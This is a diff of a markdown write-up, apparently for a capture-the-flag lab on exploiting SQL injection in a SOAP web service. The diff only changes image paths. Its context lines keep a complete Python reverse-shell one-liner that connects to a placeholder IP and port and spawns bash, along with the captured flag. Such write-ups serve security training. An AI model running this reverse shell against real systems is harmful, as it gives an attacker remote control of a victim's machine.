@@ -5,11 +5,11 @@ Our client tasks us with assessing a SOAP web service whose WSDL file resides at
 
 Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219173246.png)
+![](Pasted image 20250219173246.png)
 
 Let's check it out:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219173341.png)
+![](Pasted image 20250219173341.png)
 
 We get this code:
 
@@ -169,11 +169,11 @@ We can stabilize and use netcat once we get the shell using:
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219174430.png)
+![](Pasted image 20250219174430.png)
 
 And we get a better shell, let's look around for the flag:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219175030.png)
+![](Pasted image 20250219175030.png)
 
 We can see an `app.js` file, if we grep it for the flag, this happens:
 
@@ -188,5 +188,5 @@ We got our flag:
 FLAG{1337_SQL_INJECTION_IS_FUN_:)}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250219175123.png)
+![](Pasted image 20250219175123.png)
 
